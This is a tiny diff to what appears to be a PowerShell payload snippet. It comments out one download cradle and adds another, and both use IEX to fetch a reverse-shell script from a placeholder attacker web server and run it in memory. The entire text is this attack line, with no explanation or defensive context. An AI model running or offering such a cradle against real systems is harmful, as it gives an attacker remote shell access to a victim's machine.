@@ -1,1 +1,2 @@
-IEX(New-Object Net.WebClient).downloadString('http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1')
+# IEX(New-Object Net.WebClient).downloadString('http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1')
+IEX(IWR -UseBasicParsing http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1)
